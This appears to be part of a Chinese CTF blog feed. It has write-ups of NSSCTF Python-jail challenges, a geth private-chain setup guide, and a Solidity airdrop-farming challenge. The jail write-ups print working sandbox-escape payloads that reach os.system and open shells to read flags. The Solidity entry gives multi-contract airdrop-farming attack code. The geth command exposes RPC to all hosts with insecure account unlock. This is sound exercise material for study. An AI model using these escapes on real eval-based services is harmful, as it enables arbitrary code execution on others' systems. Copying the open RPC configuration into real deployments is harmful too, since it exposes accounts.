则可以得到字符串</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">bytes</span>([<span class="hljs-number">115</span>, <span class="hljs-number">121</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>]).decode() <br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">().__class__.__base__.__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[<span class="hljs-built_in">bytes</span>([<span class="hljs-number">115</span>,<span class="hljs-number">121</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>]).decode()](<span class="hljs-built_in">bytes</span>([<span class="hljs-number">115</span>,<span class="hljs-number">104</span>]).decode()<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28711</span><br><br>  _                _                           _       _ _   _                _ _  _<br> | |              (_)                         (_)     (_) | | |              | | || |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt; ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ cat flag<br>flag=NSSCTF&#123;4f4a6110-<span class="hljs-number">7705</span>-4ddb-b6d3-b9448d1651b0&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level4-0-5"><a href="#calc-jail-beginner-level4-0-5" class="headerlink" title="calc_jail_beginner_level4.0.5"></a>calc_jail_beginner_level4.0.5</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28903</span><br><br>  _                _                           _       _ _   _                _ _  _    ___   _____<br> | |              (_)                         (_)     (_) | | |              | | || |  / _ \ | ____|<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| | | || |__<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| | | ||___ \<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |_| | ___) |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)\___(_)____/<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,&quot;,&#x27;</span> Good luck!<br>&gt;<br></code></pre></td></tr></table></figure><p>没有给源码，但是有提示，与上一个相同。</p><h4 id="calc-jail-beginner-level4-1"><a href="#calc-jail-beginner-level4-1" class="headerlink" title="calc_jail_beginner_level4.1"></a>calc_jail_beginner_level4.1</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28800</span><br><br>  _                _                           _       _ _   _                _ _  _  __<br> | |              (_)                         (_)     (_) | | |              | | || |/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,&quot;,&#x27;</span> Good luck!<br></code></pre></td></tr></table></figure><p>依然没有源码，但是bytes被ban了，那么从类中找到第六个 &lt;class ‘bytes_iterator’&gt;</p><p>那么构造bytes ：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">().__class__.__base__.__subclasses__()[<span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28800</span><br><br>  _                _                           _       _ _   _                _ _  _  __<br> | |              (_)                         (_)     (_) | | |              | | || |/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,&quot;,&#x27;</span> Good luck!<br>&gt; ().__class__.__base__.__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="hljs-number">6</span>]([<span class="hljs-number">115</span>, <span class="hljs-number">121</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="hljs-number">6</span>]([<span class="hljs-number">115</span>, <span class="hljs-number">104</span>]).decode())<br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">cat: flag: No such file or directory</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">flag_y0u_CaNt_FiNd_mE  server.py</span><br><span class="hljs-string">$ cat flag_y0u_CaNt_FiNd_mE</span><br><span class="hljs-string">flag=NSSCTF&#123;d68bd386-1f8c-4a42-83a7-077253f3bfb7&#125;</span><br><span class="hljs-string">$</span><br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level4-2"><a href="#calc-jail-beginner-level4-2" class="headerlink" title="calc_jail_beginner_level4.2"></a>calc_jail_beginner_level4.2</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28502</span><br><br>  _                _                           _       _ _   _                _ _  _   ___<br> | |              (_)                         (_)     (_) | | |              | | || | |__ \<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_   ) |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| / /<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ / /_<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&quot;,&#x27;</span>,+ Good luck!<br></code></pre></td></tr></table></figure><p>第一种方法还是之前bytes被ban的情况。</p><p>另一中方法则是使用doc函数</p><p>但是由于+以及’被ban了可以先用join方法，然后用str()来绕过’</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28502</span><br><br>  _                _                           _       _ _   _                _ _  _   ___<br> | |              (_)                         (_)     (_) | | |              | | || | |__ \<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_   ) |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| / /<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ / /_<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&quot;,&#x27;</span>,+ Good luck!<br>&gt; ().__class__.__base__.__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[<span class="hljs-built_in">str</span>().join([().__doc__[<span class="hljs-number">19</span>],().__doc__[<span class="hljs-number">86</span>],().__doc__[<span class="hljs-number">19</span>],().__doc__[<span class="hljs-number">4</span>],().__doc__[<span class="hljs-number">17</span>],().__doc__[<span class="hljs-number">10</span>]])](<span class="hljs-built_in">str</span>().join([().__doc__[<span class="hljs-number">19</span>],().__doc__[<span class="hljs-number">56</span>]]))<br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">flag_y0u_CaNt_FiNd_mE  server.py</span><br><span class="hljs-string">$ cat flag_y0u_CaNt_FiNd_mE</span><br><span class="hljs-string">flag=NSSCTF&#123;2ebbdbce-3567-4357-a156-0662bfbbf67c&#125;</span><br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level4-3"><a href="#calc-jail-beginner-level4-3" class="headerlink" title="calc_jail_beginner_level4.3"></a>calc_jail_beginner_level4.3</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28754</span><br><br>  _                _                           _       _ _   _                _ _  _   ____<br> | |              (_)                         (_)     (_) | | |              | | || | |___ \<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ &lt;<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,&quot;,&#x27;</span>,+ Good luck!<br>&gt;<br></code></pre></td></tr></table></figure><p>依然可以用上面的payload。</p>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GETH 搭建私链</title>
    <link href="/2023/10/24/GETH-%E6%90%AD%E5%BB%BA%E7%A7%81%E9%93%BE/"/>
    <url>/2023/10/24/GETH-%E6%90%AD%E5%BB%BA%E7%A7%81%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h3 id="1-下载客户端"><a href="#1-下载客户端" class="headerlink" title="1.下载客户端"></a>1.下载客户端</h3><p>在下载geth时，要注意版本不要太高，最新版本的geth不支持搭建私链。</p><p>这里是11.6版本。</p><h3 id="2-准备创世块的配置文件"><a href="#2-准备创世块的配置文件" class="headerlink" title="2.准备创世块的配置文件"></a>2.准备创世块的配置文件</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;chainId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;homesteadBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;byzantiumBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constantinopleBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;eip155Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;eip158Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;eip150Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;eip150Hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;coinbase&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;difficulty&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x20000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;extraData&quot;</span>  <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gasLimit&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0xffffffff&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;nonce&quot;</span>      <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000042&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mixhash&quot;</span>    <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;parentHash&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;timestamp&quot;</span>  <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x00&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;alloc&quot;</span>      <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="3-初始化写入创世区块"><a href="#3-初始化写入创世区块" class="headerlink" title="3.初始化写入创世区块"></a>3.初始化写入创世区块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs geth">geth init --datadir data1 genesis.json<br></code></pre></td></tr></table></figure><h3 id="4-启动geth"><a href="#4-启动geth" class="headerlink" title="4.启动geth"></a>4.启动geth</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">geth --datadir data1 --networkid <span class="hljs-number">10</span> --http --http.<span class="hljs-property">addr</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> --http.<span class="hljs-property">port</span> <span class="hljs-number">8545</span> --http.<span class="hljs-property">corsdomain</span> <span class="hljs-string">&quot;*&quot;</span> --http.<span class="hljs-property">api</span> <span class="hljs-string">&quot;db,eth,net,web3,personal,web3&quot;</span> --port <span class="hljs-number">30305</span> -allow-insecure-unlock <span class="hljs-variable language_">console</span> <span class="hljs-number">2</span>&gt;&gt;geth.<span class="hljs-property">log</span><br></code></pre></td></tr></table></figure><ol><li><strong>.&#x2F;geth</strong>：这是执行 Geth 客户端的命令。</li><li><strong>–datadir data1</strong>：这个选项指定了数据目录的路径，Geth 将在这个目录中存储区块链数据和相关文件。</li><li><strong>–networkid 10</strong>：指定私有链的网络标识符，这个值用于在不同私有链之间进行区分。</li><li><strong>–http</strong>：启用 HTTP-RPC 通信接口，允许通过 HTTP 请求与 Geth 进行交互。</li><li><strong>–http.addr 0.0.0.0</strong>：设置 HTTP-RPC 服务监听的地址，0.0.0.0 表示允许来自任何 IP 地址的连接。</li><li><strong>–http.port 8545</strong>：指定 HTTP-RPC 服务的端口号，一般是 8545。</li><li>**–http.corsdomain “*“*<em>：配置允许跨域请求的域名，设置为 “</em>“ 表示允许任何域名进行跨域请求。</li><li>**–http.api “db,eth,net,web3,personal,web3”**：指定启用的 HTTP-RPC 接口，这里列出了一些常用的接口，包括数据库、以太坊操作、网络信息、Web3 功能和个人账户操作。</li><li><strong>–port 30305</strong>：设置 Geth 节点的 P2P 网络端口，用于节点间的通信。</li><li><strong>-allow-insecure-unlock</strong>：允许以不安全的方式解锁账户。这在测试环境中使用，允许在 HTTP-RPC 上发送解锁账户的请求，但在生产环境中不建议使用</li></ol><h3 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h3><p><a href="https://www.bilibili.com/read/cv25915543/">一步步教程：使用Geth在本地搭建私有以太坊区块链 - 哔哩哔哩 (bilibili.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Airdrop Hunting</title>
    <link href="/2023/10/24/Airdrop-Hunting/"/>
    <url>/2023/10/24/Airdrop-Hunting/</url>
    
    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>薅羊毛攻击指使用多个不同的新账户来调用空投函数获得空投币并转账至攻击者账户以达到财富累计的一种攻击方式。这类攻击方式较为普通且常见，只要是有空投函数的合约都能够进行薅羊毛。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>数字经济大赛 2019 的 jojo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract jojo &#123;<br>    mapping(address =&gt; uint) public balanceOf;<br>    mapping(address =&gt; uint) public gift;<br>    address owner;<br><br>    constructor()public&#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    event SendFlag(string b64email);<br><br>    function payforflag(string b64email) public &#123;<br>        require(balanceOf[msg.sender] &gt;= 100000);<br>        emit SendFlag(b64email);<br>    &#125;<br><br>    function jojogame() payable&#123;<br>        uint geteth = msg.value / 1000000000000000000;<br>        balanceOf[msg.sender] += geteth;<br>    &#125;<br><br>    function gift() public &#123;<br>        assert(gift[msg.sender] == 0);<br>        balanceOf[msg.sender] += 100;<br>        gift[msg.sender] = 1;<br>    &#125;<br><br>    function transfer(address to,uint value) public&#123;<br>        assert(balanceOf[msg.sender] &gt;= value);<br>        balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>分析如果想要出发flag函数需要余额&gt;&#x3D;100000； 而单单gift()函数一次只能增加余额100，所以可以创建1000个临时合约来调用空投函数，并进行转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract jojo &#123;<br>    mapping(address =&gt; uint) public balanceOf;<br>    mapping(address =&gt; uint) public gift;<br>    address owner;<br>        <br>    constructor(address instance)public&#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    event SendFlag(string b64email);<br>    <br>    function payforflag(string b64email) public &#123;<br>        require(balanceOf[msg.sender] &gt;= 100000);<br>        emit SendFlag(b64email);<br>    &#125;<br>    <br>    function jojogame() payable&#123;<br>        uint geteth=msg.value/1000000000000000000;<br>        balanceOf[msg.sender]+=geteth;<br>    &#125;<br>    <br>    function gift() public &#123;<br>        assert(gift[msg.sender]==0);<br>        balanceOf[msg.sender]+=100;<br>        gift[msg.sender]=1;<br>    &#125;<br>    <br>    function transfer(address to,uint value) public&#123;<br>        assert(balanceOf[msg.sender] &gt;= value);<br>        balanceOf[msg.sender]-=value;<br>        balanceOf[to]+=value;<br>    &#125;<br>    <br>&#125;<br>contract Attack&#123;<br>   function attack(uint num)&#123;<br>    for(uint i=0;i&lt;num;i++)&#123;<br>        new Hack(this);<br>    &#125;<br>   &#125;<br>   function getflag(string email)public &#123;<br>    jojo target=jojo(0xD15e151C53bfbDcaf21f5FC849167c526c5A4572);<br>    target.payforflag(email);<br>   &#125;<br>&#125;<br><br>contract Hack&#123;<br>constructor(address target)&#123;<br>    jojo tem=jojo(0xD15e151C53bfbDcaf21f5FC849167c526c5A4572);<br>    tem.gift();<br>    tem.transfer(target,100);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Randomness</title>
    <link href="/2023/10/22/Randomness/"/>
    <url>/2023/10/22/Randomness/</url>
    
